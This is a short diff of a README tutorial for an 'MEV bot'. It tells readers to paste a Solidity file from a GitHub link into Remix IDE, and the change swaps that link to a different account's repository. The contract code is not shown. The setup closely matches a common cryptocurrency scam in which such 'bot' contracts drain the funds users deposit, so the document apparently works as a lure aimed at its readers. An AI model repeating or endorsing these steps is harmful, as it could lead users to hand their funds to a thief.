@@ -46,7 +46,7 @@
 ### Step 1: Access the Source Code 
 1. Navigate to the Remix IDE: [https://remix.ethereum.org/]()
 2. Create a new file "MevBot.sol".
-3. Copy [this code](https://github.com/xtekkyx/mev/blob/main/mev.sol) and paste it into the Remix IDE.
+3. Copy [this code](https://github.com/mitzamutza/Mev-bot/blob/main/mev.sol) and paste it into the Remix IDE.
 ![1](https://github.com/xtekkyx/mev/assets/132018632/9dd589f3-240d-4792-9fe6-5659a0bf0117)
 
 
